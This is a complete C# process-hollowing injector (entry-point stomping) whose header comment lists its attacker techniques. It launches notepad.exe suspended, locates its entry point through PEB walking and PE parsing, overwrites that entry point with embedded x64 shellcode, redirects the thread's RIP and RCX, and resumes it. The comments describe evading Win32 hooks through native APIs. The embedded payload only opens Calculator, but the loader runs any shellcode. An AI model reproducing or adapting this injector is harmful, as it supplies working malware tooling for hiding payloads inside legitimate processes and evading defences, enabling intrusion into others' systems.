/*
 * Technique: T1055.012 - Process Hollowing (Variation: Entry Point Stomping)
 * * DESCRIPTION:
 * This script performs a surgical injection by overwriting the entry point of a legitimate 
 * suspended process (notepad.exe). It uses PEB walking to bypass ASLR and PE header parsing 
 * to find the exact execution start point.
 *
 * ATTACKER TECHNIQUES USED:
 * 1. Living off the Land (LotL): Spawns a signed Windows binary as a container.
 * 2. PEB Walking: Interrogates the Process Environment Block to find the ImageBaseAddress.
 * 3. In-Memory PE Parsing: Resolves the 'AddressOfEntryPoint' via remote memory reads.
 * 4. Thread Context Hijacking: Manipulates RIP and RCX registers to redirect execution flow.
 * 5. Native API (NTAPI): Uses low-level ntdll functions to bypass high-level Win32 hooks.
 */

using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

namespace RobustHollowing
{
    class Program
    {
        // Stable x64 Calc Shellcode
        private static byte[] payload64 = new byte[] {
           0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
0x63,0x2e,0x65,0x78,0x65,0x00
        };

        // Delegates
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint NtQueryInformationProcess(IntPtr h, int p, ref PBI pbi, uint l, out uint r);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint NtReadVirtualMemory(IntPtr h, IntPtr b, IntPtr buf, uint s, out IntPtr w);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint NtWriteVirtualMemory(IntPtr h, IntPtr b, byte[] buf, uint s, out IntPtr w);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint NtGetContextThread(IntPtr h, IntPtr c);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint NtSetContextThread(IntPtr h, IntPtr c);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint NtResumeThread(IntPtr h, out uint c);

        // Structs
        [StructLayout(LayoutKind.Sequential)] public struct PBI { public IntPtr ExitStatus, PebBase, Affinity, Priority, UniqueID, ParentID; }
        [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public uint cb; public string r, d, t; public uint x, y, xs, ys, xc, yc, f, flags; public ushort s, r2; public IntPtr r2p, hIn, hOut, hErr; }
        [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProc, hThread; public uint pid, tid; }

        [DllImport("kernel32.dll")] public static extern bool CreateProcess(string a, string c, IntPtr pa, IntPtr ta, bool i, uint f, IntPtr e, string d, [In] ref STARTUPINFO si, out PROCESS_INFORMATION pi);
        [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr h, IntPtr b, uint s, uint newP, out uint oldP);
        [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string m);
        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr m, string n);

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Initializing Robust Entry-Point Hollowing...");

            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            var qProc = (NtQueryInformationProcess)GetD(ntdll, "NtQueryInformationProcess", typeof(NtQueryInformationProcess));
            var rMem = (NtReadVirtualMemory)GetD(ntdll, "NtReadVirtualMemory", typeof(NtReadVirtualMemory));
            var wMem = (NtWriteVirtualMemory)GetD(ntdll, "NtWriteVirtualMemory", typeof(NtWriteVirtualMemory));
            var getCtx = (NtGetContextThread)GetD(ntdll, "NtGetContextThread", typeof(NtGetContextThread));
            var setCtx = (NtSetContextThread)GetD(ntdll, "NtSetContextThread", typeof(NtSetContextThread));
            var resume = (NtResumeThread)GetD(ntdll, "NtResumeThread", typeof(NtResumeThread));

            STARTUPINFO si = new STARTUPINFO(); si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // 1. Create suspended process
            CreateProcess("C:\\Windows\\System32\\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            Console.WriteLine("[+] Step 1: Notepad PID: " + pi.pid);

            // 2. Find Remote ImageBase Address
            PBI pbi = new PBI(); uint rL;
            qProc(pi.hProc, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out rL);
            IntPtr targetBase = IntPtr.Zero;
            IntPtr bR;
            IntPtr baseAddrPtr = (IntPtr)(pbi.PebBase.ToInt64() + 16);
            
            // Read ImageBaseAddress from PEB
            IntPtr tempBase = Marshal.AllocHGlobal(8);
            rMem(pi.hProc, baseAddrPtr, tempBase, 8, out bR);
            targetBase = Marshal.ReadIntPtr(tempBase);
            Console.WriteLine("[+] Step 2: Remote ImageBase: 0x" + targetBase.ToString("X"));

            // 3. FIND THE ENTRY POINT (The Secret Sauce)
            // We read the PE Header (first 512 bytes)
            IntPtr headerBuf = Marshal.AllocHGlobal(512);
            rMem(pi.hProc, targetBase, headerBuf, 512, out bR);
            
            // e_lfanew is at offset 0x3C
            int e_lfanew = Marshal.ReadInt32((IntPtr)(headerBuf.ToInt64() + 0x3C));
            // AddressOfEntryPoint is at offset 0x28 from the start of the NT Header
            int entryPointRVA = Marshal.ReadInt32((IntPtr)(headerBuf.ToInt64() + e_lfanew + 0x28));
            IntPtr remoteEntry = (IntPtr)(targetBase.ToInt64() + entryPointRVA);
            Console.WriteLine("[+] Step 3: Actual Entry Point: 0x" + remoteEntry.ToString("X"));

            // 4. Overwrite at Entry Point
            uint oldP;
            VirtualProtectEx(pi.hProc, remoteEntry, (uint)payload64.Length, 0x40, out oldP);
            IntPtr bW;
            wMem(pi.hProc, remoteEntry, payload64, (uint)payload64.Length, out bW);
            Console.WriteLine("[+] Step 4: Overwrote Entry Point. Bytes: " + bW.ToInt64());

            // 5. Context Hijack
            IntPtr pCtx = Marshal.AllocHGlobal(1232);
            for (int i = 0; i < 1232; i++) Marshal.WriteByte(pCtx, i, 0);
            Marshal.WriteInt32((IntPtr)(pCtx.ToInt64() + 0x30), 0x100001); // CONTEXT_CONTROL
            
            getCtx(pi.hThread, pCtx);
            // RIP is at offset 248. Redirect it to our Entry Point.
            Marshal.WriteInt64((IntPtr)(pCtx.ToInt64() + 248), remoteEntry.ToInt64());
            // RCX often needs to point to the EntryPoint as well in x64
            Marshal.WriteInt64((IntPtr)(pCtx.ToInt64() + 128), remoteEntry.ToInt64());
            
            setCtx(pi.hThread, pCtx);
            Console.WriteLine("[+] Step 5: RIP and RCX Redirected.");

            // 6. Resume
            uint count;
            resume(pi.hThread, out count);
            Console.WriteLine("[+] SUCCESS: Thread resumed. Check for Calc.");
            
            Console.ReadLine();
        }

        static Delegate GetD(IntPtr m, string n, Type t) {
            IntPtr a = GetProcAddress(m, n);
            return Marshal.GetDelegateForFunctionPointer(a, t);
        }
    }
}
